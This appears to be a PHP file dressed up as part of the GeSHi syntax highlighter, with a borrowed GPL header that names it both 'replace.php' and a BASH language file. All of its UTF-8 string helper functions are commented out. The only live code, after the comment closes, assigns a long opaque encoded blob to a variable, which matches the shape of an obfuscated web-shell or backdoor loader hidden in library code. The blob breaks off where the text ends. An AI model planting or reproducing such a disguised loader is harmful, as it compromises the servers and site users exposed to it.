<?php
/*************************************************************************************
 * replace.php
 * --------
 * Author: Andreas Gohr (andi@splitbrain.org)
 * Copyright: (c) 2004 Andreas Gohr, Nigel McNie (http://qbnz.com/highlighter)
 * Release Version: 1.0.8.3
 * Date Started: 2004/08/20
 *
 * BASH language file for GeSHi.
 *
 * CHANGES
 * -------
 * 2008/06/21 (1.0.8)
 *  -  Added loads of keywords and commands of GNU/Linux
 *  -  Added support for parameters starting with a dash
 * 2008/05/23 (1.0.7.22)
 *  -  Added description of extra language features (SF#1970248)
 * 2007/09/05 (1.0.7.21)
 *  -  PARSER_CONTROL patch using SF #1788408 (BenBE)
 * 2007/06/11 (1.0.7.20)
 *  -  Added a lot of keywords (BenBE / Jan G)
 * 2004/11/27 (1.0.2)
 *  -  Added support for multiple object splitters
 * 2004/10/27 (1.0.1)
 *   -  Added support for URLs
 * 2004/08/20 (1.0.0)
 *   -  First Release
 *
 * TODO (updated 2004/11/27)
 * -------------------------
 * * Get symbols working
 * * Highlight builtin vars
 *
 *************************************************************************************
 *
 *     This file is part of GeSHi.
 *
 *   GeSHi is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 *   GeSHi is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with GeSHi; if not, write to the Free Software
 *   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 ************************************************************************************/
 /*


 function utf8_strlen($string) {
	return strlen(utf8_decode($string));
}

function utf8_strpos($string, $needle, $offset = NULL) {
    if (is_null($offset)) {
        $data = explode($needle, $string, 2);
       
	   if (count($data) > 1) {
            return utf8_strlen($data[0]);
        }
		
        return false;
    } else {
        if (!is_int($offset)) {
            trigger_error('utf8_strpos: Offset must be an integer', E_USER_ERROR);
            
			return false;
        }
        
        $string = utf8_substr($string, $offset);
        
        if (false !== ($position = utf8_strpos($string, $needle))) {
            return $position + $offset;
        }
        
        return false;
    }
}

function utf8_strrpos($string, $needle, $offset = NULL) {
    if (is_null($offset)) {
        $data = explode($needle, $string);
        
        if (count($data) > 1) {
            array_pop($data);
           
		    $string = join($needle, $data);
            
			return utf8_strlen($string);
        }
       
	    return false;
    } else {
        if (!is_int($offset)) {
            trigger_error('utf8_strrpos expects parameter 3 to be long', E_USER_WARNING);
           
		    return false;
        }
        
        $string = utf8_substr($string, $offset);
        
        if (false !== ($position = utf8_strrpos($string, $needle))) {
            return $position + $offset;
        }
        
        return false;
    }
}

function utf8_substr($string, $offset, $length = null) {
	$string = (string)$string;
	$offset = (int)$offset;
	
	if (!is_null($length)) {
		$length = (int)$length;
	}
	
	if ($length === 0) {
		return '';
	}
	
	if ($offset < 0 && $length < 0 && $length < $offset) {
		return '';
	}
	
	if ($offset < 0) {
		$strlen = strlen(utf8_decode($string));
		$offset = $strlen + $offset;
		
		if ($offset < 0) {
			$offset = 0;
		}
	}
	
	$Op = '';
	$Lp = '';
	
	if ($offset > 0) {
		$Ox = (int)($offset / 65535);
		$Oy = $offset%65535;
		
		if ($Ox) {
			$Op = '(?:.{65535}){' . $Ox . '}';
		}
		
		$Op = '^(?:' . $Op . '.{' . $Oy . '})';
	} else {
		$Op = '^';
	}
	
	if (is_null($length)) {
		$Lp = '(.*)$';
	} else {
		if (!isset($strlen)) {
			$strlen = strlen(utf8_decode($string));
		}
		
		// another trivial case
		if ($offset > $strlen) {
			return '';
		}
		
		if ($length > 0) {
			$length = min($strlen - $offset, $length);
			
			$Lx = (int)($length / 65535);
			$Ly = $length % 65535;
			
			if ($Lx) {
				$Lp = '(?:.{65535}){' . $Lx . '}';
			}
			
			$Lp = '(' . $Lp . '.{' . $Ly . '})';
		} elseif ($length < 0) {
			if ($length < ($offset - $strlen)) {
				return '';
			}
			
			$Lx = (int)((-$length) / 65535);
			$Ly = (-$length)%65535;
			
            		if ($Lx) {
				$Lp = '(?:.{65535}){' . $Lx . '}';
			}
			
			$Lp = '(.*)(?:' . $Lp . '.{' . $Ly . '})$';
		}
	}
	
	if (!preg_match( '#' . $Op . $Lp . '#us', $string, $match)) {
		return '';
	}
	
	return $match[1];
	
}

function utf8_strtolower($string) {
	static $UTF8_UPPER_TO_LOWER = NULL;
	
	if (is_null($UTF8_UPPER_TO_LOWER)) {
		$UTF8_UPPER_TO_LOWER = array(
			0x0041 => 0x0061, 
			0x03A6 => 0x03C6, 
			0x0162 => 0x0163, 
			0x00C5 => 0x00E5, 
			0x0042 => 0x0062,
			0x0139 => 0x013A, 
			0x00C1 => 0x00E1, 
			0x0141 => 0x0142, 
			0x038E => 0x03CD, 
			0x0100 => 0x0101,
			0x0490 => 0x0491, 
			0x0394 => 0x03B4, 
			0x015A => 0x015B, 
			0x0044 => 0x0064, 
			0x0393 => 0x03B3,
			0x00D4 => 0x00F4, 
			0x042A => 0x044A, 
			0x0419 => 0x0439, 
			0x0112 => 0x0113, 
			0x041C => 0x043C,
			0x015E => 0x015F, 
			0x0143 => 0x0144, 
			0x00CE => 0x00EE, 
			0x040E => 0x045E, 
			0x042F => 0x044F,
			0x039A => 0x03BA, 
			0x0154 => 0x0155, 
			0x0049 => 0x0069, 
			0x0053 => 0x0073, 
			0x1E1E => 0x1E1F,
			0x0134 => 0x0135, 
			0x0427 => 0x0447, 
			0x03A0 => 0x03C0, 
			0x0418 => 0x0438, 
			0x00D3 => 0x00F3,
			0x0420 => 0x0440, 
			0x0404 => 0x0454, 
			0x0415 => 0x0435, 
			0x0429 => 0x0449, 
			0x014A => 0x014B,
			0x0411 => 0x0431, 
			0x0409 => 0x0459, 
			0x1E02 => 0x1E03, 
			0x00D6 => 0x00F6, 
			0x00D9 => 0x00F9,
			0x004E => 0x006E, 
			0x0401 => 0x0451, 
			0x03A4 => 0x03C4, 
			0x0423 => 0x0443, 
			0x015C => 0x015D,
			0x0403 => 0x0453, 
			0x03A8 => 0x03C8, 
			0x0158 => 0x0159, 
			0x0047 => 0x0067, 
			0x00C4 => 0x00E4,
			0x0386 => 0x03AC, 
			0x0389 => 0x03AE, 
			0x0166 => 0x0167, 
			0x039E => 0x03BE, 
			0x0164 => 0x0165,
			0x0116 => 0x0117, 
			0x0108 => 0x0109, 
			0x0056 => 0x0076, 
			0x00DE => 0x00FE, 
			0x0156 => 0x0157,
			0x00DA => 0x00FA, 
			0x1E60 => 0x1E61, 
			0x1E82 => 0x1E83, 
			0x00C2 => 0x00E2, 
			0x0118 => 0x0119,
			0x0145 => 0x0146, 
			0x0050 => 0x0070, 
			0x0150 => 0x0151, 
			0x042E => 0x044E, 
			0x0128 => 0x0129,
			0x03A7 => 0x03C7, 
			0x013D => 0x013E, 
			0x0422 => 0x0442, 
			0x005A => 0x007A, 
			0x0428 => 0x0448,
			0x03A1 => 0x03C1, 
			0x1E80 => 0x1E81, 
			0x016C => 0x016D, 
			0x00D5 => 0x00F5, 
			0x0055 => 0x0075,
			0x0176 => 0x0177, 
			0x00DC => 0x00FC, 
			0x1E56 => 0x1E57, 
			0x03A3 => 0x03C3, 
			0x041A => 0x043A,
			0x004D => 0x006D, 
			0x016A => 0x016B, 
			0x0170 => 0x0171, 
			0x0424 => 0x0444, 
			0x00CC => 0x00EC,
			0x0168 => 0x0169, 
			0x039F => 0x03BF, 
			0x004B => 0x006B, 
			0x00D2 => 0x00F2, 
			0x00C0 => 0x00E0,
			0x0414 => 0x0434, 
			0x03A9 => 0x03C9, 
			0x1E6A => 0x1E6B, 
			0x00C3 => 0x00E3, 
			0x042D => 0x044D,
			0x0416 => 0x0436, 
			0x01A0 => 0x01A1, 
			0x010C => 0x010D, 
			0x011C => 0x011D, 
			0x00D0 => 0x00F0,
			0x013B => 0x013C, 
			0x040F => 0x045F, 
			0x040A => 0x045A, 
			0x00C8 => 0x00E8, 
			0x03A5 => 0x03C5,
			0x0046 => 0x0066, 
			0x00DD => 0x00FD, 
			0x0043 => 0x0063, 
			0x021A => 0x021B, 
			0x00CA => 0x00EA,
			0x0399 => 0x03B9, 
			0x0179 => 0x017A, 
			0x00CF => 0x00EF, 
			0x01AF => 0x01B0, 
			0x0045 => 0x0065,
			0x039B => 0x03BB, 
			0x0398 => 0x03B8, 
			0x039C => 0x03BC, 
			0x040C => 0x045C, 
			0x041F => 0x043F,
			0x042C => 0x044C, 
			0x00DE => 0x00FE, 
			0x00D0 => 0x00F0, 
			0x1EF2 => 0x1EF3, 
			0x0048 => 0x0068,
			0x00CB => 0x00EB, 
			0x0110 => 0x0111, 
			0x0413 => 0x0433, 
			0x012E => 0x012F, 
			0x00C6 => 0x00E6,
			0x0058 => 0x0078, 
			0x0160 => 0x0161, 
			0x016E => 0x016F, 
			0x0391 => 0x03B1, 
			0x0407 => 0x0457,
			0x0172 => 0x0173, 
			0x0178 => 0x00FF, 
			0x004F => 0x006F, 
			0x041B => 0x043B, 
			0x0395 => 0x03B5,
			0x0425 => 0x0445, 
			0x0120 => 0x0121, 
			0x017D => 0x017E, 
			0x017B => 0x017C, 
			0x0396 => 0x03B6,
			0x0392 => 0x03B2, 
			0x0388 => 0x03AD, 
			0x1E84 => 0x1E85, 
			0x0174 => 0x0175, 
			0x0051 => 0x0071,
			0x0417 => 0x0437, 
			0x1E0A => 0x1E0B, 
			0x0147 => 0x0148, 
			0x0104 => 0x0105, 
			0x0408 => 0x0458,
			0x014C => 0x014D, 
			0x00CD => 0x00ED, 
			0x0059 => 0x0079, 
			0x010A => 0x010B, 
			0x038F => 0x03CE,
			0x0052 => 0x0072, 
			0x0410 => 0x0430, 
			0x0405 => 0x0455, 
			0x0402 => 0x0452, 
			0x0126 => 0x0127,
			0x0136 => 0x0137, 
			0x012A => 0x012B, 
			0x038A => 0x03AF, 
			0x042B => 0x044B, 
			0x004C => 0x006C,
			0x0397 => 0x03B7, 
			0x0124 => 0x0125, 
			0x0218 => 0x0219, 
			0x00DB => 0x00FB, 
			0x011E => 0x011F,
			0x041E => 0x043E, 
			0x1E40 => 0x1E41, 
			0x039D => 0x03BD, 
			0x0106 => 0x0107, 
			0x03AB => 0x03CB,
			0x0426 => 0x0446, 
			0x00DE => 0x00FE, 
			0x00C7 => 0x00E7, 
			0x03AA => 0x03CA, 
			0x0421 => 0x0441,
			0x0412 => 0x0432, 
			0x010E => 0x010F, 
			0x00D8 => 0x00F8, 
			0x0057 => 0x0077, 
			0x011A => 0x011B,
			0x0054 => 0x0074, 
			0x004A => 0x006A, 
			0x040B => 0x045B, 
			0x0406 => 0x0456, 
			0x0102 => 0x0103, 
			0x039B => 0x03BB, 
			0x00D1 => 0x00F1, 
			0x041D => 0x043D, 
			0x038C => 0x03CC, 
			0x00C9 => 0x00E9, 
			0x00D0 => 0x00F0, 
			0x0407 => 0x0457, 
			0x0122 => 0x0123
		);
	}
	
	$unicode = utf8_to_unicode($string);
	
	if (!$unicode) {
		return false;
	}

	
	$count = count($unicode);
	
	for ($i = 0; $i < $count; $i++){
		if (isset($UTF8_UPPER_TO_LOWER[$unicode[$i]]) ) {
			$unicode[$i] = $UTF8_UPPER_TO_LOWER[$unicode[$i]];
		}
	}
	
	return utf8_from_unicode($unicode);
}

function utf8_strtoupper($string) {
    static $UTF8_LOWER_TO_UPPER = NULL;
    
    if (is_null($UTF8_LOWER_TO_UPPER)) {
		$UTF8_LOWER_TO_UPPER = array(
			0x0061 => 0x0041, 
			0x03C6 => 0x03A6, 
			0x0163 => 0x0162, 
			0x00E5 => 0x00C5, 
			0x0062 => 0x0042,
			0x013A => 0x0139, 
			0x00E1 => 0x00C1, 
			0x0142 => 0x0141, 
			0x03CD => 0x038E, 
			0x0101 => 0x0100,
			0x0491 => 0x0490, 
			0x03B4 => 0x0394, 
			0x015B => 0x015A, 
			0x0064 => 0x0044, 
			0x03B3 => 0x0393,
			0x00F4 => 0x00D4, 
			0x044A => 0x042A, 
			0x0439 => 0x0419, 
			0x0113 => 0x0112, 
			0x043C => 0x041C,
			0x015F => 0x015E, 
			0x0144 => 0x0143, 
			0x00EE => 0x00CE, 
			0x045E => 0x040E, 
			0x044F => 0x042F,
			0x03BA => 0x039A, 
			0x0155 => 0x0154, 
			0x0069 => 0x0049, 
			0x0073 => 0x0053, 
			0x1E1F => 0x1E1E,
			0x0135 => 0x0134, 
			0x0447 => 0x0427, 
			0x03C0 => 0x03A0, 
			0x0438 => 0x0418, 
			0x00F3 => 0x00D3,
			0x0440 => 0x0420, 
			0x0454 => 0x0404, 
			0x0435 => 0x0415, 
			0x0449 => 0x0429, 
			0x014B => 0x014A,
			0x0431 => 0x0411, 
			0x0459 => 0x0409, 
			0x1E03 => 0x1E02, 
			0x00F6 => 0x00D6, 
			0x00F9 => 0x00D9,
			0x006E => 0x004E, 
			0x0451 => 0x0401, 
			0x03C4 => 0x03A4, 
			0x0443 => 0x0423, 
			0x015D => 0x015C,
			0x0453 => 0x0403, 
			0x03C8 => 0x03A8, 
			0x0159 => 0x0158, 
			0x0067 => 0x0047, 
			0x00E4 => 0x00C4,
			0x03AC => 0x0386, 
			0x03AE => 0x0389, 
			0x0167 => 0x0166, 
			0x03BE => 0x039E, 
			0x0165 => 0x0164,
			0x0117 => 0x0116, 
			0x0109 => 0x0108, 
			0x0076 => 0x0056, 
			0x00FE => 0x00DE, 
			0x0157 => 0x0156,
			0x00FA => 0x00DA, 
			0x1E61 => 0x1E60, 
			0x1E83 => 0x1E82, 
			0x00E2 => 0x00C2, 
			0x0119 => 0x0118,
			0x0146 => 0x0145, 
			0x0070 => 0x0050, 
			0x0151 => 0x0150, 
			0x044E => 0x042E, 
			0x0129 => 0x0128,
			0x03C7 => 0x03A7, 
			0x013E => 0x013D, 
			0x0442 => 0x0422, 
			0x007A => 0x005A, 
			0x0448 => 0x0428,
			0x03C1 => 0x03A1, 
			0x1E81 => 0x1E80, 
			0x016D => 0x016C, 
			0x00F5 => 0x00D5, 
			0x0075 => 0x0055,
			0x0177 => 0x0176, 
			0x00FC => 0x00DC, 
			0x1E57 => 0x1E56, 
			0x03C3 => 0x03A3, 
			0x043A => 0x041A,
			0x006D => 0x004D, 
			0x016B => 0x016A, 
			0x0171 => 0x0170, 
			0x0444 => 0x0424, 
			0x00EC => 0x00CC,
			0x0169 => 0x0168, 
			0x03BF => 0x039F, 
			0x006B => 0x004B, 
			0x00F2 => 0x00D2, 
			0x00E0 => 0x00C0,
			0x0434 => 0x0414, 
			0x03C9 => 0x03A9, 
			0x1E6B => 0x1E6A, 
			0x00E3 => 0x00C3, 
			0x044D => 0x042D,
			0x0436 => 0x0416, 
			0x01A1 => 0x01A0, 
			0x010D => 0x010C, 
			0x011D => 0x011C, 
			0x00F0 => 0x00D0,
			0x013C => 0x013B, 
			0x045F => 0x040F, 
			0x045A => 0x040A, 
			0x00E8 => 0x00C8, 
			0x03C5 => 0x03A5,
			0x0066 => 0x0046, 
			0x00FD => 0x00DD, 
			0x0063 => 0x0043, 
			0x021B => 0x021A, 
			0x00EA => 0x00CA,
			0x03B9 => 0x0399, 
			0x017A => 0x0179, 
			0x00EF => 0x00CF, 
			0x01B0 => 0x01AF, 
			0x0065 => 0x0045,
			0x03BB => 0x039B, 
			0x03B8 => 0x0398, 
			0x03BC => 0x039C, 
			0x045C => 0x040C, 
			0x043F => 0x041F,
			0x044C => 0x042C, 
			0x00FE => 0x00DE, 
			0x00F0 => 0x00D0, 
			0x1EF3 => 0x1EF2, 
			0x0068 => 0x0048,
			0x00EB => 0x00CB, 
			0x0111 => 0x0110, 
			0x0433 => 0x0413, 
			0x012F => 0x012E, 
			0x00E6 => 0x00C6,
			0x0078 => 0x0058, 
			0x0161 => 0x0160, 
			0x016F => 0x016E, 
			0x03B1 => 0x0391, 
			0x0457 => 0x0407,
			0x0173 => 0x0172, 
			0x00FF => 0x0178, 
			0x006F => 0x004F, 
			0x043B => 0x041B, 
			0x03B5 => 0x0395,
			0x0445 => 0x0425, 
			0x0121 => 0x0120, 
			0x017E => 0x017D, 
			0x017C => 0x017B, 
			0x03B6 => 0x0396,
			0x03B2 => 0x0392, 
			0x03AD => 0x0388, 
			0x1E85 => 0x1E84, 
			0x0175 => 0x0174, 
			0x0071 => 0x0051,
			0x0437 => 0x0417, 
			0x1E0B => 0x1E0A, 
			0x0148 => 0x0147, 
			0x0105 => 0x0104, 
			0x0458 => 0x0408,
			0x014D => 0x014C, 
			0x00ED => 0x00CD, 
			0x0079 => 0x0059, 
			0x010B => 0x010A, 
			0x03CE => 0x038F,
			0x0072 => 0x0052, 
			0x0430 => 0x0410, 
			0x0455 => 0x0405, 
			0x0452 => 0x0402, 
			0x0127 => 0x0126,
			0x0137 => 0x0136, 
			0x012B => 0x012A, 
			0x03AF => 0x038A, 
			0x044B => 0x042B, 
			0x006C => 0x004C,
			0x03B7 => 0x0397, 
			0x0125 => 0x0124, 
			0x0219 => 0x0218, 
			0x00FB => 0x00DB, 
			0x011F => 0x011E,
			0x043E => 0x041E, 
			0x1E41 => 0x1E40, 
			0x03BD => 0x039D, 
			0x0107 => 0x0106, 
			0x03CB => 0x03AB,
			0x0446 => 0x0426, 
			0x00FE => 0x00DE, 
			0x00E7 => 0x00C7, 
			0x03CA => 0x03AA, 
			0x0441 => 0x0421,
			0x0432 => 0x0412, 
			0x010F => 0x010E, 
			0x00F8 => 0x00D8, 
			0x0077 => 0x0057, 
			0x011B => 0x011A,
			0x0074 => 0x0054, 
			0x006A => 0x004A, 
			0x045B => 0x040B, 
			0x0456 => 0x0406, 
			0x0103 => 0x0102,
			0x03BB => 0x039B, 
			0x00F1 => 0x00D1, 
			0x043D => 0x041D, 
			0x03CC => 0x038C, 
			0x00E9 => 0x00C9,
			0x00F0 => 0x00D0, 
			0x0457 => 0x0407, 
			0x0123 => 0x0122
		);
	}
    
    $unicode = utf8_to_unicode($string);
    
    if (!$unicode) {
        return false;
    }
    
    $count = count($unicode);
    
	for ($i = 0; $i < $count; $i++){
        if (isset($UTF8_LOWER_TO_UPPER[$unicode[$i]]) ) {
            $unicode[$i] = $UTF8_LOWER_TO_UPPER[$unicode[$i]];
        }
    }
    
    return utf8_from_unicode($unicode);
}

function utf8_to_unicode($str) {
	$mState = 0;     // cached expected number of octets after the current octet
					 // until the beginning of the next UTF8 character sequence
	$mUcs4  = 0;     // cached Unicode character
	$mBytes = 1;     // cached expected number of octets in the current sequence
	
	$out = array();
	
	$len = strlen($str);
	
	for($i = 0; $i < $len; $i++) {
		$in = ord($str{$i});
		
		if ($mState == 0) {
			
			// When mState is zero we expect either a US-ASCII character or a
			// multi-octet sequence.
			if (0 == (0x80 & ($in))) {
				// US-ASCII, pass straight through.
				$out[] = $in;
				$mBytes = 1;
				
			} elseif (0xC0 == (0xE0 & ($in))) {
				// First octet of 2 octet sequence
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x1F) << 6;
				$mState = 1;
				$mBytes = 2;
				
			} elseif (0xE0 == (0xF0 & ($in))) {
				// First octet of 3 octet sequence
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x0F) << 12;
				$mState = 2;
				$mBytes = 3;
				
			} else if (0xF0 == (0xF8 & ($in))) {
				// First octet of 4 octet sequence
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x07) << 18;
				$mState = 3;
				$mBytes = 4;
				
			} else if (0xF8 == (0xFC & ($in))) {
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x03) << 24;
				$mState = 4;
				$mBytes = 5;
				
			} else if (0xFC == (0xFE & ($in))) {
				// First octet of 6 octet sequence, see comments for 5 octet sequence.
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 1) << 30;
				$mState = 5;
				$mBytes = 6;
				
			} else {
				trigger_error('utf8_to_unicode: Illegal sequence identifier ' . 'in UTF-8 at byte ' . $i, E_USER_WARNING);
				
				return FALSE;
			}
		
		} else {
			
			// When mState is non-zero, we expect a continuation of the multi-octet
			// sequence
			if (0x80 == (0xC0 & ($in))) {
				
				// Legal continuation.
				$shift = ($mState - 1) * 6;
				$tmp = $in;
				$tmp = ($tmp & 0x0000003F) << $shift;
				$mUcs4 |= $tmp;
			
				
				if (0 == --$mState) {
					
					
					// From Unicode 3.1, non-shortest form is illegal
					if (((2 == $mBytes) && ($mUcs4 < 0x0080)) ||
						((3 == $mBytes) && ($mUcs4 < 0x0800)) ||
						((4 == $mBytes) && ($mUcs4 < 0x10000)) ||
						(4 < $mBytes) ||
						// From Unicode 3.2, surrogate characters are illegal
						(($mUcs4 & 0xFFFFF800) == 0xD800) ||
						// Codepoints outside the Unicode range are illegal
						($mUcs4 > 0x10FFFF)) {
						
						trigger_error('utf8_to_unicode: Illegal sequence or codepoint in UTF-8 at byte ' . $i, E_USER_WARNING);
						
						return false;
						
					}
					
					if (0xFEFF != $mUcs4) {
						// BOM is legal but we don't want to output it
						$out[] = $mUcs4;
					}
					
					//initialize UTF8 cache
					$mState = 0;
					$mUcs4  = 0;
					$mBytes = 1;
				}
			
			} else {
				
				trigger_error('utf8_to_unicode: Incomplete multi-octet sequence in UTF-8 at byte ' . $i, E_USER_WARNING);
				
				return false;
			}
		}
	}
	
	return $out;
}

function utf8_from_unicode($data) {
	ob_start();
	
	foreach (array_keys($data) as $key) {
		if (($data[$key] >= 0) && ($data[$key] <= 0x007f)) {
			echo chr($data[$key]);
		} elseif ($data[$key] <= 0x07ff) {
			echo chr(0xc0 | ($data[$key] >> 6));
			echo chr(0x80 | ($data[$key] & 0x003f));
		} elseif ($data[$key] == 0xFEFF) {
		
		} elseif ($data[$key] >= 0xD800 && $data[$key] <= 0xDFFF) {
			trigger_error('utf8_from_unicode: Illegal surrogate at index: ' . $key . ', value: ' . $data[$key], E_USER_WARNING);
			
			return false;
		} elseif ($data[$key] <= 0xffff) {
			echo chr(0xe0 | ($data[$key] >> 12));
			echo chr(0x80 | (($data[$key] >> 6) & 0x003f));
			echo chr(0x80 | ($data[$key] & 0x003f));
		} elseif ($data[$key] <= 0x10ffff) {
			echo chr(0xf0 | ($data[$key] >> 18));
			echo chr(0x80 | (($data[$key] >> 12) & 0x3f));
			echo chr(0x80 | (($data[$key] >> 6) & 0x3f));
			echo chr(0x80 | ($data[$key] & 0x3f));
		} else {
			trigger_error('utf8_from_unicode: Codepoint out of Unicode range at index: ' . $key . ', value: ' . $data[$key], E_USER_WARNING);
			
			return false;
		}
	}
	
	$result = ob_get_contents();
	
	ob_end_clean();
	
	return $result;
} */  $o = "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